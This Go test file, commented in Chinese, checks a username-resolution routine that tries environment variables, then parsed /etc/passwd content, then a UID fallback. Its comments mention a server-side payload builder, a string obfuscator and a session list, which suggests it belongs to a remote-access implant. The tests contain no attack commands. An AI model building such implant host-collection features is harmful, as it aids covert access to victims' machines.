package main

// username.go 的单测（纯函数，喂假 /etc/passwd 内容与假环境变量，Windows 亦可在
// 渲染后的模板目录里跑：go test -run Username ./...）。
// 本文件不会进载荷：构建器只做 go build，_test.go 被忽略。

import (
	"errors"
	"testing"
)

// samplePasswd 用 var 而不是 const：模板目录里的 .go 文件会被服务端构建器的字符串
// 混淆器处理，const 里的字符串字面量不能改写成函数调用（const 要求编译期常量）。
// 本文件虽不参与 go build，仍按同一纪律写，避免把"模板里不能出现 const 字符串"这条
// 规矩再破一次。
var samplePasswd = `root:x:0:0:root:/root:/bin/bash
# 注释行必须被忽略
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+::::::
alice:x:1000:1000:Alice:/home/alice:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
`

// getenv 是测试用的假环境变量表。
func fakeGetenv(m map[string]string) func(string) string {
	return func(k string) string { return m[k] }
}

func TestParsePasswdUsername(t *testing.T) {
	cases := []struct {
		name  string
		uid   int
		want  string
		found bool
	}{
		{"root(uid=0)", 0, "root", true},
		{"alice(uid=1000)", 1000, "alice", true},
		{"nobody 高 uid", 65534, "nobody", true},
		{"uid 不在文件里", 4242, "", false},
		{"负 uid", -1, "", false},
		{"NIS 行不命中", 1001, "", false},
	}
	for _, c := range cases {
		got, ok := parsePasswdUsername(samplePasswd, c.uid)
		if got != c.want || ok != c.found {
			t.Errorf("%s: parsePasswdUsername(uid=%d) = (%q,%v), want (%q,%v)",
				c.name, c.uid, got, ok, c.want, c.found)
		}
	}
	if _, ok := parsePasswdUsername("", 0); ok {
		t.Error("空 passwd 内容不应命中")
	}
	// 空用户名 / 字面 unknown 不得当成功（否则会话列表还是 unknown）。
	if name, ok := parsePasswdUsername("\n:x:1005:1005::/home/x:/bin/sh\n", 1005); ok {
		t.Errorf("空用户名字段不应命中, got %q", name)
	}
	if name, ok := parsePasswdUsername("unknown:x:1006:1006::/:/bin/sh\n", 1006); ok {
		t.Errorf("字面量 unknown 不应被当成采集成功, got %q", name)
	}
}

func TestResolveUsernameFromEnvFirst(t *testing.T) {
	env := map[string]string{"USER": "alice", "LOGNAME": "bob", "SUDO_USER": "carol"}
	if got := resolveUsernameFrom(0, fakeGetenv(env), samplePasswd, nil); got != "alice" {
		t.Errorf("USER 应优先, got %q", got)
	}
	// USER 为空 → LOGNAME
	if got := resolveUsernameFrom(0, fakeGetenv(map[string]string{"LOGNAME": "bob"}), samplePasswd, nil); got != "bob" {
		t.Errorf("USER 空时应回退 LOGNAME, got %q", got)
	}
	// USER/LOGNAME 都空 → SUDO_USER
	env = map[string]string{"SUDO_USER": "carol"}
	if got := resolveUsernameFrom(0, fakeGetenv(env), samplePasswd, nil); got != "carol" {
		t.Errorf("应回退 SUDO_USER, got %q", got)
	}
	// 空串与字面 unknown 都视为"没有值"（很多容器里 USER="unknown" 之类）
	env = map[string]string{"USER": "unknown", "LOGNAME": ""}
	if got := resolveUsernameFrom(1000, fakeGetenv(env), samplePasswd, nil); got != "alice" {
		t.Errorf("USER=unknown 应继续走 passwd 兜底, got %q", got)
	}
}

func TestResolveUsernameFromPasswdFallback(t *testing.T) {
	// 无环境变量：uid 命中 passwd → 真实用户名（不是 unknown）
	if got := resolveUsernameFrom(0, fakeGetenv(nil), samplePasswd, nil); got != "root" {
		t.Errorf("uid=0 应解析出 root, got %q", got)
	}
	if got := resolveUsernameFrom(1000, fakeGetenv(nil), samplePasswd, nil); got != "alice" {
		t.Errorf("uid=1000 应解析出 alice, got %q", got)
	}
}

func TestResolveUsernameFromUIDFallback(t *testing.T) {
	// /etc/passwd 读失败（distroless 容器）→ uid:<n>，不是 unknown
	got := resolveUsernameFrom(1000, fakeGetenv(nil), "", errTestReadFailed)
	if got != "uid:1000" {
		t.Errorf("passwd 不可用时应回落 uid:1000, got %q", got)
	}
	// uid 不在文件里 → 仍是 uid:<n>
	if got := resolveUsernameFrom(4242, fakeGetenv(nil), samplePasswd, nil); got != "uid:4242" {
		t.Errorf("uid 不在 passwd 中时应回落 uid:4242, got %q", got)
	}
	// uid=0 且文件读失败 → uid:0（容器里很常见，比 unknown 有用）
	if got := resolveUsernameFrom(0, fakeGetenv(nil), "", errTestReadFailed); got != "uid:0" {
		t.Errorf("应回落 uid:0, got %q", got)
	}
	// 真正的最后一档：连 uid 都拿不到
	if got := resolveUsernameFrom(-1, fakeGetenv(nil), "", errTestReadFailed); got != "unknown" {
		t.Errorf("无 uid 时才允许 unknown, got %q", got)
	}
}

// errTestReadFailed 模拟 /etc/passwd 打不开。
var errTestReadFailed = errors.New("open /etc/passwd: no such file or directory")
